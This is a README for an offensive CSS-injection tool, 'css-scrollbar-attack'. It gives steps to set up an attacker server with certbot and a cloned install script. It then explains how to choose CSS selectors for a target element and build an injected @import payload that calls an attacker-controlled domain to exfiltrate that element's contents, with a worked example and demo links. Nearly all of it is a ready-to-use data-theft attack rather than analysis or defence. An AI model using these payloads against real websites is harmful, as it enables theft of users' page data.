# Install on your own server

0. Get a Debian 12 VPS and link a domain(any.com) to your server and wait for it to  propagate(https://www.whatsmydns.net/) (usually takes 1hour)

1. Run the following on the Debian 12 VPS:

   ```bash
   apt install certbot python3-certbot-apache -y
   certbot --authenticator webroot --installer apache --register-unsafely-without-email
   ```
  - Agree to the terms, enter the domain(any.com) you linked earlier and enter the webroot /var/www/html

2. Then run the following:

```bash
apt install git -y && git clone https://github.com/sys0wn/css-scrollbar-attack && cd css-scrollbar-attack && chmod +x install.sh && bash install.sh
```
# How to use it

1. On the website you are trying to target pick an html element you want to steal.
2. Find a combination of css selectors, that points directly to the element(e.g: p { color: red } targets all p-tags, so if there is more than 1 it doesn't point to ONLY one element and therefore no exfiltration will be possible). Use Selectors like ```https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_selectors``` and combine as many as needed to point directly to the target element. Examples for this:

```
<!doctype html>
<body>
<div>
   <h4>a</h4>
   <p id=leakme class="leakme">stealThis</p>
</div>
</body>
</html>
```

Here, the "stealThis" could be pointed to for example by: p {}, div > p {}, #leakme {}, .leakme {}, div > #leakme {}, body > div > p {}, h4 + p {}, div > h4 + p {} and many many more


You can test if your combination of selectors points directly to your target element by hitting CTRL+SHIFT+C and searching for something like ```#leakme``` or ```div > p```; If there is only one result for your search that is a combination of selectors you can use!

3. Create the payload for your CSS-Injection by plugging your combination of selectors into the following syntax: ```<style>@import url('//any.com/%23leakme/css.css');</style>``` where you have to replace the %23leakme with your URL-ENCODED(you can use websites like https://www.urlencoder.org/) combination of selectors.

# Example

```
<!doctype html>
<body>
<div>
   <h4>a</h4>
   <p id=leakme class="leakme">stealThis</p>
</div>
</body>
</html>
```

```div > h4 + p```  -->  ```<style>@import url('//any.com/div%20%3E%20h4%20%2B%20p/css.css');</style>```

# Demo

https://jsfiddle.net/q3mc5kxn/1/
https://any.com/index.html                 //Once you've installed it on your server
